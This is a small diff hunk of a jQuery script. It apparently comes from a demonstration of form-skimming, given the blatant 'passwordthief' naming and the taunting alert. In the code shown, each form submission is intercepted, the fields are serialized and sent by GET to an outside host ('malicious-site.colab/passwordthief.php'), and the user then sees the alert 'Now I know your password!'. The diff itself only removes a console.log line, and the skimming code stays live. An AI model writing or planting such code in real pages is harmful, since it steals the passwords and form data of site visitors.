@@ -5,8 +5,6 @@ jQuery(document).ready(function($){
 		e.preventDefault();
 		var formInfo = $(this).serialize();
 		$.get('http://malicious-site.colab/passwordthief.php?' + formInfo);
-		console.log($(this).serialize);
 		alert('Now I know your password!');
 	});
-
 });
